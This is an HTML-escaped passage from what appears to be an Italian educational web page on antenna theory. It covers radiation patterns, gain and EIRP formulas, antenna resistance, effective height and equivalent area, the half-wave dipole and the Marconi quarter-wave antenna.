&lt;li&gt;&lt;em&gt;&lt;strong&gt;Dispositivi ausiliari&lt;/strong&gt;&lt;/em&gt;: sono necessari nei grandi impianti per segnalare la presenza dell’antenna, per la protezione contro il ghiaccio, il vento e l’acqua, per il puntamento dell’antenna nel caso di antenne direttive.&lt;/li&gt;
&lt;/ul&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/antenna3.jpeg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;hr&gt;
&lt;h1 id=&#34;diagramma-di-radiazione-e-solido-di-radiazione&#34;&gt;Diagramma di radiazione e solido di radiazione&lt;/h1&gt;
&lt;p&gt;Per rappresentare le direzioni preferenziali in cui irradia un’antenna si utilizza un diagramma di radiazione (&lt;em&gt;radiation pattern&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Un antenna reale, non irradia in modo uniforme in tutte le direzioni dello spazio. Questo diagramma mette bene in evidenza l’attitudine che ha una sorgente a concetrare la potenza in certe direzioni e quindi ne evidenzia il grado di direttività:&lt;/p&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/antenna4.jpeg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;p&gt;Il &lt;strong&gt;diagramma di radiazione&lt;/strong&gt; è una curva, riportata di solito su un diagramma polare con al centro l’antenna, che rappresenta come la potenza fornita in ingresso all’antenna viene distribuita nella varie direzione del piano considerato.&lt;/p&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/antenna5.jpeg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;p&gt;Il diagramma di radiazione può riportare i valori del &lt;em&gt;guadagno&lt;/em&gt; che l’antenna presenta nelle varie direzioni del piano considerato, espressi in decibel.&lt;/p&gt;
&lt;p&gt;Normalmente si tracciano i diagrammi di radiazione in due piani tra loro ortogonali denominati:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Piano verticale o piano E&lt;/strong&gt;: è il piano in cui giace il vettore campo elettrico E ed è anche il piano su cui giace un’antenna lineare;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Piano orizzontale o piano H&lt;/strong&gt;: è il piano in cui giace il vettore campo magnetico H ed è anche il piano che taglia ortogonalmente l’antenna;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A seconda di come è fatto il diagramma di radiazione in un determinato piano, un’antenna viene definita:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;&lt;strong&gt;Omnidirezionale&lt;/strong&gt;&lt;/em&gt;: se il diagramma di radiazione in quel piano è all’incirca un cerchio l’antenna irradia uniformemente in tutte le direzioni;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;strong&gt;Direttiva&lt;/strong&gt;&lt;/em&gt;: se il diagramma di radiazione in quel piano presenta delle direzioni prefenziali di irraggiamento&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;strong&gt;Direttiva unidirezionale&lt;/strong&gt;&lt;/em&gt;: se il diagramma di radiazione mostra una direzione preferenziale di irragiamento, quella anteriore data dal &lt;em&gt;lobo principale&lt;/em&gt; del diagramma. Altre direzioni di minore irraggiamento, non desiderate, definite dai &lt;em&gt;lobi secondari&lt;/em&gt; del diagramma di radiazione.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1 id=&#34;guadagno-di-unantenna&#34;&gt;Guadagno di un’antenna&lt;/h1&gt;
&lt;p&gt;Il guadagno di un’antenna è un parametro che mette in evidenza quanto un’antenna può concentrare la potenza in una certa direzione rispetto a un’antenna di riferimento. Il guadagno di un’antenna è direttiva tanto più alto è il suo guadagno.&lt;/p&gt;
&lt;p&gt;A seconda dell’impiego si possono avere due antenne di riferimento:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Antenna isotropa&lt;/strong&gt;: un’antenna puramente ideale, che irradia in modo uniforme in tutte le direzioni.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Dipolo in \(\lambda /2\)&lt;/strong&gt;: viene utilizzata come riferimento per le antenne lineari, in particolare nel settore delle antenne riceveneti TV.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;guadagno-rispetto-allantenna-isotropica&#34;&gt;Guadagno rispetto all’antenna isotropica&lt;/h2&gt;
&lt;p&gt;Il guadagno di un’antenna può essere definito come il rapporto fra la potenza che è necessaria dare in ingresso a un’antenna isotropica ideale è la potenza che è necessario fornire al connettore dell’antenna in esame.&lt;/p&gt;
&lt;p&gt;Il guadagno rispetto all’antenna isotropica si calcola come:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}
G = 10\log_{10} \space \dfrac{P_{ISO}}{P_{IN}} \space [dBi]
$$&lt;/p&gt;
&lt;p&gt;Il guadagno viene espresso in \(dBi\) per indicare che è stato ottenuto prendendo come riferimento l’antenna isotropica ideale (i = isotropica).&lt;/p&gt;
&lt;p&gt;Il guadagno di un’antenna esprime l’aumento della potenza irradiata che si ottiene concentrando la potenza in certe direzioni.&lt;/p&gt;
&lt;p&gt;Il valore del guadagno nelle altre direzioni, denominato &lt;strong&gt;guadagno direttivo&lt;/strong&gt;, può essere fornito tramite un &lt;em&gt;diagramma di radiazione&lt;/em&gt; in cui si riporta il guadagno per i diversi angoli.&lt;/p&gt;
&lt;p&gt;Quando il guadagno viene espresso semplicemente in \(dB\) risulta sottointeso che l’antenna di riferimento è quella isotropa anche se non si mette.&lt;/p&gt;
&lt;p&gt;Noto il guadagno è possibile calcolare il livello con cui dovrebbe irradiare un’antenna per produrre lo stesso campo dell’antenna in considerazione:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}
G_{[dB]} = 10\log_{10} \space P_{ISO} - 10\log_{10} \space P_{IN} = EIRP - L_{P_IN}
$$&lt;/p&gt;
&lt;p&gt;Da cui si ottiene la seguente formula inversa:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}
EIRP = L_{P_IN} \space + \space G_{dB}
$$&lt;/p&gt;
&lt;p&gt;Se non è noto il livello di potenza in ingresso all’antenna ( \(L_{P_IN}\) ), è possibile calcolarlo in funzione del livello di potenza del trasmettitore ( \(L_{P_TX}\) ) e dell’attenuazione della linea (feeder, \(A_F\)) come:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}
L_{P_IN} = L_{P_TX} - A_F
$$&lt;/p&gt;
&lt;p&gt;La &lt;strong&gt;direttivitá&lt;/strong&gt; \(D\) il rapporto tra la potenza che dovrebbe irradiare un’antenna isotropica ( \(P_{ISO}\) ) e la potenza irradiata ( \(P_{IRR}\) ) dall’antenna in esame affinche il campo da loro prodotto sia lo stesso:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}
D = 10\log_{10} \space \dfrac{P_{ISO}}{P_{IRR}} \space [dBi]
$$&lt;/p&gt;
&lt;p&gt;Il guadagno effettivo (\(G\)), detto anche &lt;em&gt;guadagno di potenza&lt;/em&gt;, é minore della direttivitá (\(G &amp;lt; D\)) a causa del fatto che un’antenna reale causa una piccola dissipazione di potenza, per cui la potenza irradiata é inferiore rispetto alla potenza in ingresso.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;guadagno-rispetto-allantenna-al-dipolo-in-λ2&#34;&gt;Guadagno rispetto all’antenna al dipolo in &lt;strong&gt;λ/2&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Il guadagno viene espresso in \(dBd\) quando si prende come antenna di riferimento il dipolo \(\lambda/2\), il pedice $d$ sta proprio a indicare che si é presa come antenna di riferimento il dipolo in \(\lambda/2\).&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;principali-tipi-di-antenne&#34;&gt;Principali tipi di antenne&lt;/h1&gt;
&lt;p&gt;È possibile identificare due categorie principali:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Antenne lineari&lt;/strong&gt;: esse sono omnidirezionali a banda larga, direttive;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Antenna a dipolo&lt;/strong&gt;&lt;/em&gt;: un dipolo è un&amp;rsquo;antenna costituita da due elementi conduttori che sono allineati elettricamente, ma con polarità opposta. Il dipolo è un&amp;rsquo;antenna molto comune e può essere utilizzato in molte applicazioni wireless, come le trasmissioni radio e televisive.&lt;/p&gt;
&lt;p&gt;Il dipolo è solitamente costituito da un filo metallico sottile che viene tagliato a una lunghezza specifica in base alla frequenza di trasmissione desiderata. Quando il dipolo viene alimentato con un segnale di frequenza corrispondente alla sua lunghezza, le correnti elettriche fluiscono attraverso i suoi elementi, creando un campo elettromagnetico che si irradia nell&amp;rsquo;ambiente circostante.&lt;/p&gt;
&lt;p&gt;Il dipolo è una delle antenne più semplici e convenienti da costruire, ed è spesso utilizzato come riferimento per la valutazione di altre antenne più complesse. Il dipolo può anche essere utilizzato in combinazione con altri elementi per creare antenne più direzionali o per migliorare le prestazioni in determinate direzioni.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Antenne a superficie&lt;/strong&gt;: esse sono antenne direttive con alto guadagno; tra esse la più diffusa è l’antenna a parabola;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;principio-di-funzionamento-delle-antenne-lineari&#34;&gt;Principio di funzionamento delle antenne lineari&lt;/h2&gt;
&lt;p&gt;Consideriamo un tronco di linea bifilare con terminazione aperta alimentato da un generatore a radiofrequenza ($RF$). Su di esso si viene ad instaurare un regime di onde stazionarie di corrente e tensione. Questa linea irradia poco per due motivi:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;I due conduttori sono vicini e per questo motivio l’irradiazione di uno di essi cancella quella dell’altro.&lt;/li&gt;
&lt;li&gt;Se si considera lo spazio come un carico esso risulta fortemente disadattato e così si ha poco trasferimento di potenza a essa.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Se però si piegano a $90\degree$gradi le estremità della linea, le correnti avranno lo stesso verso in questo tratto e sarà quindi possibile irradiare energia nello spazio in modo efficiente. In questo modo si ottiene un antenna denominata &lt;em&gt;antenna a dipolo&lt;/em&gt; o &lt;em&gt;antenna Hertziana&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Dunque in sintesi: Se si vuole massimizzare l’irradiazione è necessario piegare i coduttori a una distanza \(\lambda/4\) dall’estremità ottenendo così un’antenna lunga \(\lambda/2\), denominata per questo dipolo &lt;strong&gt;\(\lambda/2\)&lt;/strong&gt; o &lt;strong&gt;dipolo a mezz’onda&lt;/strong&gt;.&lt;/p&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/antenna6.jpeg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;p&gt;Il dipolo \(\lambda/2\) , ha un comportamento simile a quello di un tronco di linea in \(\lambda/4\); l’onda stazionaria di corrente presenta un minimo alle estremità, mentre è massimo al centro.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;banda-di-unantenna-lineare&#34;&gt;Banda di un’antenna lineare&lt;/h2&gt;
&lt;p&gt;Un’antenna lineare, a dipolo, ha un comportamento analogo a quello di un circuito risonante.&lt;/p&gt;
&lt;p&gt;La &lt;strong&gt;banda&lt;/strong&gt; (\(B\)) di un’antenna può essere defnita come l’intervallo di frequenza entro cui il ROS si mantiene entro dei limiti. Tipicamente i valori limite di ROS sono compresi tra \(1,5\) e \(2\).&lt;/p&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/antenna7.jpeg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;p&gt;La banda di una antenna è in pratica l’intervallo di frequenza in cui il diagramma di radiazione dell’antenna fornisce le prestazioni richieste.&lt;/p&gt;
&lt;p&gt;La banda dipende dal diametro del conduttore con il quale si realizza l’antenna.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;resistenza-dantenna&#34;&gt;Resistenza d’antenna&lt;/h2&gt;
&lt;p&gt;Un’antenna rappresenta per la linea (feeder) un carico che é resistivo in risonanza e viene denominato &lt;em&gt;resistenza d’antenna&lt;/em&gt; ( \(R_a\) ). La resistenza d’antenna viene considerata come la somma di due resistenze:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;La resistenza di radiazione ( \(R_r\) )&lt;/li&gt;
&lt;li&gt;La resistenza di dissipazione (\( R_d\) )&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$$
\Large\textsf{}
R_a \space = \space R_r \space + \space R_d \space [Ω]
$$&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;resistenza-di-radiazione&#34;&gt;Resistenza di radiazione&lt;/h3&gt;
&lt;p&gt;La resistenza di radiazione é definita come il rapporto tra la potenza irradiata dall’antenna ( \(P_{IRR}\) ) e il quadrato della corrente ( \(I_{IN}\) ) che giunge in ingresso all’antenna (punto di alimentazione):&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}
R_r = \dfrac{P_{IRR}}{I^2_{IN}} \space [Ω]
$$&lt;/p&gt;
&lt;p&gt;La resistenza di radiazione é quella resistenza che dissipa una potenza pari a quella irradiata dall’antenna. Per un dipolo la \(R_r\) dipende da diversi fattori, tra i quali:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Diametro del conduttore&lt;/strong&gt;: la \(R_r\) aumenta al diminuire del diametro del coduttore&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Altezza dal suolo&lt;/strong&gt;: alla quale si pone l’antenna; le onde elettromagnetiche emesse dall’antenna possono venire riflesse dalla terra ed indurre una corrente nell’antenna. A seconda della distanza percorsa varia la fase della corrente indotta e quindi varia la corrente totale. Si modifica percío anche la resistenza di radiazione&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;resistenza-di-dissipazione&#34;&gt;Resistenza di dissipazione&lt;/h3&gt;
&lt;p&gt;La resistenza di dissipazione tiene conto della perdita di potenza che si puó avere sull’antenna. Per valutare le perdite sull’antenna si definie il &lt;strong&gt;rendimento&lt;/strong&gt; ( \(\eta\) ) dato dal rapporto fra la potenza irradiata ( \(P_{IRR}\) ) e la potenza in ingresso all’antenna ( \(P_{IN}\) ):&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}\eta = \dfrac{P_{IRR}}{P_{IN}} = \dfrac{R_r}{R_r + R_d}
$$&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;parametri-tipi-di-delle-antenne-riceventi&#34;&gt;Parametri tipi di delle antenne riceventi&lt;/h2&gt;
&lt;p&gt;In risonanza un’antenna ricevente puó essere considerata come un generatore avente resistenza interna \(R_a\), in grado di erogare una certa tensione e una certa potenza a un carico \(R_u\):&lt;/p&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/antenna8.jpeg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;p&gt;Supponendo che l’antenna sia adattata e correttamente orientata, la tensione e la potenza che essa é in grado di erogare dipendono da due parametri di traduzione, ossia:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;L’altezza efficace ( \(h\) )&lt;/li&gt;
&lt;li&gt;L’area equivalente ( \(A_{eq} \))&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;altezza-efficace&#34;&gt;Altezza efficace&lt;/h3&gt;
&lt;p&gt;L&amp;rsquo;altezza efficace \(h_e\)  è un termine utilizzato in telecomunicazioni per descrivere l&amp;rsquo;altezza a cui un&amp;rsquo;antenna appare &amp;ldquo;efficace&amp;rdquo; nel trasferimento di segnali radio. In particolare, si riferisce all&amp;rsquo;altezza a cui un&amp;rsquo;antenna sembra essere vista dall&amp;rsquo;altro lato della comunicazione.&lt;/p&gt;
&lt;p&gt;Inoltre, l&amp;rsquo;altezza efficace di un&amp;rsquo;antenna dipende da diversi fattori, tra cui l&amp;rsquo;altezza fisica dell&amp;rsquo;antenna, la frequenza del segnale trasmesso, la presenza di ostacoli o interferenze nell&amp;rsquo;ambiente circostante e la potenza di trasmissione dell&amp;rsquo;antenna.&lt;/p&gt;
&lt;p&gt;Fattore di traduzione da campo elettrico indicente ( \(E \space V/m\) ) a tensione d’uscita ( \(RMS\) ) a vuoto, \(V_g \space (V)\):&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}V_g = h_e * E
$$&lt;/p&gt;
&lt;p&gt;Poiche \(E\) si esprime in \(V/m\), mentre \(V_g\) é in \(V\), \(h_e\) si esprime in mentri. Per le antenna a dipolo l’altezza efficace si puó calcolare come:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}h_e = \lambda\sqrt{\dfrac{R_r * G}{\pi * Z_0}} \space [m]
$$&lt;/p&gt;
&lt;p&gt;Dove:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;\(R_r\): resistenza di radiazione;&lt;/li&gt;
&lt;li&gt;\(G\): guadagno dell’antenna non in db;&lt;/li&gt;
&lt;li&gt;\(Z_0 = 120 \pi\): impedenza caratteristica dello spazio libero;&lt;/li&gt;
&lt;li&gt;\(\lambda\): lunghezza d’onda dell’onda elettromagnetica indicente;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;fattore-di-traduzione-da-campo-elettrico-indicente&#34;&gt;Fattore di traduzione da campo elettrico indicente&lt;/h3&gt;
&lt;p&gt;Il fattore di traduzione da campo elettrico, noto anche come coefficiente di accoppiamento o fattore di accoppiamento, è un parametro che indica la quantità di energia elettromagnetica trasmessa da un&amp;rsquo;antenna trasmittente ad un&amp;rsquo;antenna ricevente.&lt;/p&gt;
&lt;p&gt;In particolare, il fattore di traduzione da campo elettrico misura la frazione del campo elettrico irradiato dalla prima antenna che viene ricevuta efficacemente dalla seconda antenna, tenendo conto delle caratteristiche geometriche e di orientamento delle due antenne, della distanza tra di esse e delle proprietà del mezzo di propagazione.&lt;/p&gt;
&lt;p&gt;In pratica, il fattore di traduzione da campo elettrico è un parametro importante per la progettazione e l&amp;rsquo;ottimizzazione delle antenne, poiché consente di valutare l&amp;rsquo;efficacia di un&amp;rsquo;antenna trasmittente nel trasferire energia ad un&amp;rsquo;altra antenna ricevente.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;area-equivalente&#34;&gt;Area equivalente&lt;/h3&gt;
&lt;p&gt;L&amp;rsquo;area equivalente \(A_{eq}\) è una misura dell&amp;rsquo;efficienza dell&amp;rsquo;antenna e rappresenta l&amp;rsquo;area che l&amp;rsquo;antenna sembra occupare nell&amp;rsquo;ambiente circostante in termini di capacità di ricezione o trasmissione del segnale radio.&lt;/p&gt;
&lt;p&gt;Fattore di trasduzione da densitá di potenza incidente (\(S\)) a potenza fornita al carico adattato ( \(P_u\) ):&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}P_u = S * A_q \space [W]
$$&lt;/p&gt;
&lt;p&gt;Poiché $S$ si esprime in \(W/m^2\), mentre \(P\) é in \(W\), dimensionalmente \(A_{eq}\) si esprime in \(m^2\).&lt;/p&gt;
&lt;p&gt;L’area equivalente (\( A_{eq}\) ) di un’antenna si calcome come:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}A_{eq} = G \space\dfrac{\lambda^2}{4\pi} \space [m^2]
$$&lt;/p&gt;
&lt;p&gt;Dove:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;\(G\): guadagno dell’antenna non in dB;&lt;/li&gt;
&lt;li&gt;\( \lambda \): lunghezza d’onda dell’onda elettromagnetica indicente&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;correlazione-tra-dimensioni-dellantenna-e-larea-equivalente&#34;&gt;Correlazione tra Dimensioni dell’antenna e l’area equivalente&lt;/h3&gt;
&lt;p&gt;La dimensione di un&amp;rsquo;antenna si riferisce alle sue caratteristiche fisiche, come la lunghezza, il diametro, l&amp;rsquo;altezza e l&amp;rsquo;area di apertura. La dimensione dell&amp;rsquo;antenna è importante perché determina le sue proprietà elettriche, come l&amp;rsquo;impedenza, la direttività, la polarizzazione e la larghezza di banda. In generale, le antenne più grandi hanno una maggiore direttività e una maggiore efficienza rispetto alle antenne più piccole, ma possono essere più costose e difficili da installare. Tuttavia, le dimensioni dell&amp;rsquo;antenna dipendono dalle specifiche esigenze di trasmissione e ricezione del sistema di telecomunicazioni in cui viene utilizzata. In telecomunicazioni, l&amp;rsquo;area equivalente di un&amp;rsquo;antenna è una misura del suo potere di ricezione o trasmissione, in relazione alla sua area fisica. Essa è definita come l&amp;rsquo;area di un&amp;rsquo;antenna ideale che ha lo stesso potere di ricezione o trasmissione dell&amp;rsquo;antenna reale.&lt;/p&gt;
&lt;p&gt;La dimensione dell&amp;rsquo;antenna è strettamente correlata all&amp;rsquo;area equivalente dell&amp;rsquo;antenna. In generale, le antenne più grandi hanno un&amp;rsquo;area equivalente maggiore rispetto alle antenne più piccole. Ciò significa che le antenne più grandi possono trasmettere o ricevere segnali più potenti rispetto alle antenne più piccole, a parità di condizioni.&lt;/p&gt;
&lt;p&gt;Tuttavia, la relazione tra la dimensione e l&amp;rsquo;area equivalente dell&amp;rsquo;antenna non è lineare. Ciò significa che raddoppiare la dimensione dell&amp;rsquo;antenna non raddoppia necessariamente la sua area equivalente. La relazione dipende dalle specifiche caratteristiche dell&amp;rsquo;antenna, come la sua geometria, la frequenza di lavoro e le proprietà del materiale di cui è fatta. Pertanto, la scelta delle dimensioni dell&amp;rsquo;antenna dipende dalle specifiche esigenze di trasmissione e ricezione del sistema di telecomunicazioni in cui viene utilizzata, e deve essere fatta in base a una progettazione attenta e un&amp;rsquo;analisi dettagliata delle caratteristiche dell&amp;rsquo;antenna.&lt;/p&gt;
&lt;p&gt;Nel caso del dipolo l&amp;rsquo;area equivalente è legata alla lunghezza d&amp;rsquo;onda, nel caso della parabola è legata al diametro dell&amp;rsquo;antenna.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;fattore-di-trasduzione-da-densitá-di-potenza-incidente&#34;&gt;Fattore di trasduzione da densitá di potenza incidente&lt;/h3&gt;
&lt;p&gt;Il fattore di trasduzione da densità di potenza incidente, noto anche come fattore di conversione, è un parametro che indica la capacità di un&amp;rsquo;antenna ricevente di convertire la densità di potenza del campo elettromagnetico incidente in una tensione elettrica rilevabile ai suoi terminali di uscita.&lt;/p&gt;
&lt;p&gt;In altre parole, il fattore di trasduzione da densità di potenza incidente rappresenta il rapporto tra la potenza elettrica generata ai terminali di uscita dell&amp;rsquo;antenna e la densità di potenza del campo elettromagnetico incidente sull&amp;rsquo;antenna stessa, espressa in watt per metro quadrato.&lt;/p&gt;
&lt;p&gt;Il fattore di trasduzione dipende dalle caratteristiche geometriche e di orientamento dell&amp;rsquo;antenna ricevente, dalla frequenza del segnale incidente, dalla polarizzazione del segnale elettromagnetico e dalle proprietà del mezzo di propagazione.&lt;/p&gt;
&lt;p&gt;Il fattore di trasduzione è un parametro importante per la valutazione delle prestazioni delle antenne riceventi, in quanto consente di stimare l&amp;rsquo;efficienza con cui l&amp;rsquo;antenna converte l&amp;rsquo;energia elettromagnetica incidente in una tensione di uscita utile per l&amp;rsquo;elaborazione del segnale ricevuto.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;antenne-omnidirezionali&#34;&gt;Antenne omnidirezionali&lt;/h1&gt;
&lt;p&gt;Sono omnidirezionali quelle antenne che irradiano in modo uniforme in un piano, che di solito é il piano \(H\) (orizzontale), in cui il diagramma di radiazione é un cerchio.&lt;/p&gt;
&lt;p&gt;In altri piani, come per esempio nel piano \(E\) sono direttive.&lt;/p&gt;
&lt;p&gt;Le antenne omnidirezionali sono utilizzate quando il sistema di trasmissione si trova in posizione baricentrica rispetto all’area da servire, per cui nel piano \(H\), si ha lo stesso campo indipendentemente dalla posizione dell’antenna ricevente. É questo, il caso della trasmissone in brodcast (da un trasmettitore verso tutti i ricevitori che si trovano entro l’area di copertura) di trasmettitori radio AM/FM e TV.&lt;/p&gt;
&lt;p&gt;In questo caso l’antenna fondamentale é il tipolo in \( \lambda/2\). É poi possibile intervenire sulla lunghezza o sulla sezione dell’antenna per modificare il diagramma di radiazione nel piano verticale, in modo da ottenere le caratteristiche desiderate in termini di lunghezza dell’antenna  e quindi di praticitá nell’installazione.&lt;/p&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/antenna9.jpeg&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;


&lt;hr&gt;
&lt;h2 id=&#34;dipolo-in-λ2&#34;&gt;Dipolo in &lt;strong&gt;λ/2&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;E un’antenna a dipolo la cui lunghezza fisica ( \(l\) ) é pari a \( \lambda/2\), dove \( \lambda\) é la lunghezza d’onda del segnale (portante) impresso sull’antenna. Per questo motivio viene chiamato dipolo in \( \lambda/2\)  o &lt;em&gt;dipolo a mezz’onda&lt;/em&gt; (half wave dipolo). La lunghezza fisica di un dipolo in \( \lambda/2\) si calcola come:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}l_{fisica} = \dfrac{\lambda}{2} = \dfrac{1}{2} \frac{F_v * c}{f} \space [m]
$$&lt;/p&gt;
&lt;p&gt;Dove:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;\(c \approx3 * 10^8 \space m/s\): velocitá di propagazione nel vuoto;&lt;/li&gt;
&lt;li&gt;\(F_v\): fattore di velocitá, tipicamente compreso fra \(0,92\) e \(0,98\);&lt;/li&gt;
&lt;li&gt;\(f\): frequenza (portante) del segnale che deve essere irradiato;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Anche per le antenne si definisce, infatti, un &lt;em&gt;fattore di velocitá&lt;/em&gt; (\(F_v\)), quanto la velocitá di propagazione nel conduttore é minore di quella nel vuoto. Le principali caratteristiche di un dipolo \( \lambda/2\) sono le seguenti:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Il guadagno é pari a \(G = 2,15\) dBi;&lt;/li&gt;
&lt;li&gt;Nel piano \(H\) il diagramma di radiazione é un cerchio e quindi l’antenna é omnidirezionale; nel piano \(H\)  l’intensitá del campo elettrico si puó determinare, ricordando la formula:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$$
\Large\textsf{}E = \dfrac{60 * I}{r} \space [V/m]
$$&lt;/p&gt;
&lt;p&gt;Dove:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;\(I\) (A): corrente nel punto di alimentazione;&lt;/li&gt;
&lt;li&gt;\(r\) (m): distanza dall’antenna;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Le altre caratteristiche:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;nel piano \(E\) l’antenna é direttiva, con un angolo di apertura pari a \( \theta = 78 \degree\);&lt;/li&gt;
&lt;li&gt;Nello spazio libero la resistenza di radiazione teorica é pari a \(R_r = 73 \spaceΩ\); la resistenza d’antenna effettiva, varia al variare del rapporto \( \lambda/d\) dove \(d\) é il diametro del conduttore, spesso, si inserisce un opportuno adattatore quando si collega l’antenna a un cavo coassiale con impedenza caratteristica \(Z_0 = 50 \space Ω\);&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Quando la frequenza dei segnali da trasmettere é relativamente bassa la lunghezza fisica di un dipolo \( \lambda/2\)  diventa rilevante. Sono state cosí realizzate antenne che consentono di avere lunghezze inferiori, come le seguenti: antenna Marconi o antenna in \( \lambda/4\), Ground Plane, antenne caricate.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;antenna-marconi&#34;&gt;Antenna Marconi&lt;/h2&gt;
&lt;p&gt;L’antenna Marconi (o antenna a \( \lambda/4\) ) é un’antenna che dimezza la lunghezza dell’elemento radiante rispetto al dipolo \( \lambda/2\), essa é montata verticalmente e connessa a terra attraverso il generatore che lo alimenta; questa antenna sfrutta la terra come superficie conduttrice riflettente.&lt;/p&gt;
&lt;p&gt;Il suo funzionamento si basa sul &lt;em&gt;principio delle immagini&lt;/em&gt; il quale afferma che il campo prodotto da una carica posta nelle vicinanze di un piano conduttore equivale al campo nel caso in cui vi fosse una carica di segno opposto, simmetrica rispetto al piano e detta &lt;em&gt;carica immagine&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;É possibile sostituire un semidipolo con un piano conduttore, che puó anche essere il terreno. Supponendo la terra sia un perfetto conduttore, essa produce lo stesso effetto di un semidipolo immagine, e quindi nella porzione di spazio che contiene l’antenna reale si ottiene un diagramma di radiazione analogo a quello di un dipolo \( \lambda/2\).&lt;/p&gt;
&lt;p&gt;Le caratteristiche fondamentali di un’antenna \( \lambda/4\) sono:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;L’antenna é omnidirezionale nel piano \(H\), in cui il diagramma di radiazione é un cerchio;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Il diagramma di radiazione nel piano \(E\) é pari alla metá superiore di quello del dipolo \( \lambda/2\);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Il guadagno aumenta di \(3 dB\) e diventa pari a:&lt;/p&gt;
&lt;p&gt;$$
\Large\textsf{}G = 3 dBd \implies G = 5,15 dBi
$$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
